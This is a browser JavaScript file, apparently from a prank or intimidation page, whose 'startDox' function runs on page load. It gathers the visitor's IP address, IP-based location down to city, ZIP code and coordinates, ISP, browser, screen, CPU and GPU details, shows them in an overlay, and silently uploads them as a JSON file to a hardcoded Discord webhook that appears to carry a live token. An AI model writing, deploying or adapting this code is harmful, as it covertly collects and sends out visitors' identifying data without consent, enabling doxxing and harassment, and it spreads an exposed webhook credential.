async function startDox() {
  console.log("Collecting client info...");

  const doxElement = document.getElementById("dox");
  const doxBgVideo = document.getElementById("dox-bg-vid");
  const doxOverlay = document.getElementById("dox-overlay");

  if (doxBgVideo) doxBgVideo.play();
  if (doxElement) doxElement.style.opacity = "1";

  let fontSize = Math.min(window.innerHeight / 10, window.innerWidth / 20);
  if (doxOverlay) doxOverlay.style.fontSize = fontSize + "px";

  const collectedData = {};

  async function displayInfo(label, value) {
    collectedData[label] = value;

    if (!doxOverlay) return;

    const span = document.createElement("span");
    span.innerText = `${label}: ${value}`;
    doxOverlay.appendChild(span);

    const height = doxOverlay.getBoundingClientRect().height;
    if (height > window.innerHeight) {
      fontSize = fontSize - fontSize / 10;
      doxOverlay.style.fontSize = fontSize + "px";
    }

    await new Promise((res) => setTimeout(res, 300));
  }

  try {
    const ipData = await (await fetch("https://wtfismyip.com/json")).json();
    const ip = ipData.YourFuckingIPAddress;
    const locationData = await (await fetch("https://we-are-jammin.xyz/json/" + ip)).json();

    const ua = navigator.userAgent;
    const browserData = new BrowserDetector(ua).parseUserAgent();

    await displayInfo("IP Address", ip);
    await displayInfo("Country", locationData.country);
    await displayInfo("Region", locationData.regionName);
    await displayInfo("City", locationData.city);
    await displayInfo("ZIP Code", locationData.zip);
    await displayInfo("Full Location", ipData.YourFuckingLocation);
    await displayInfo("Latitude", locationData.lat);
    await displayInfo("Longitude", locationData.lon);
    await displayInfo("Timezone", locationData.timezone);
    await displayInfo("Current Time", new Date().toLocaleString());
    await displayInfo("ISP", locationData.isp);
    await displayInfo("Organization", locationData.org);
    await displayInfo("Autonomous System", locationData.as);
    await displayInfo("Browser Name", browserData.name);
    await displayInfo("Platform Name", browserData.platform);
    await displayInfo("Browser Version", browserData.version);
    await displayInfo("Mobile/Tablet", browserData.isMobile || browserData.isTablet ? "Yes" : "No");
    await displayInfo("Referrer", document.referrer || "None");
    await displayInfo("System Languages", navigator.languages.join(", "));
    await displayInfo("Screen Width", screen.width + " px");
    await displayInfo("Screen Height", screen.height + " px");
    await displayInfo("Window Width", window.innerWidth + " px");
    await displayInfo("Window Height", window.innerHeight + " px");
    await displayInfo("Display Pixel Depth", screen.pixelDepth);
    if (typeof screen.orientation != "undefined") {
      await displayInfo("Screen Orientation", screen.orientation.type.split("-")[0]);
      await displayInfo("Screen Rotation", screen.orientation.angle + " degrees");
    }
    await displayInfo("CPU Threads", navigator.hardwareConcurrency);
    await displayInfo(
      "Available Browser Memory",
      typeof window.performance.memory != "undefined"
        ? Math.round(window.performance.memory.jsHeapSizeLimit / 1024 / 1024) + " MB"
        : "N/A"
    );

    const canvas = document.createElement("canvas");
    let gl, debugInfo;
    try {
      gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
      debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
    } catch (_) {}
    if (gl && debugInfo) {
      await displayInfo("GPU Vendor", gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL));
      await displayInfo("GPU Info", gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL));
    }

    sendToDiscordWebhook(collectedData);
  } catch (error) {
    console.error("Error collecting info:", error);
  }
}

function sendToDiscordWebhook(data) {
  const webhookUrl =
    "https://discord.com/api/webhooks/1402845085288366261/FummiU0Zb1bHBQC6qhMyTOx-ba990D6lSEnBmegUzkIH_kj-n3doBp7C6eFJtHBkJaxh";

  const jsonBlob = new Blob([JSON.stringify(data, null, 2)], { type: "application/json" });
  const jsonFile = new File([jsonBlob], "client-info.json");

  const formData = new FormData();
  formData.append("file", jsonFile);
  formData.append(
    "payload_json",
    JSON.stringify({
      content: "New client info JSON file attached.",
    })
  );

  fetch(webhookUrl, {
    method: "POST",
    body: formData,
  }).catch(console.error);
}

// Example usage: call startDox() to run the whole process
startDox();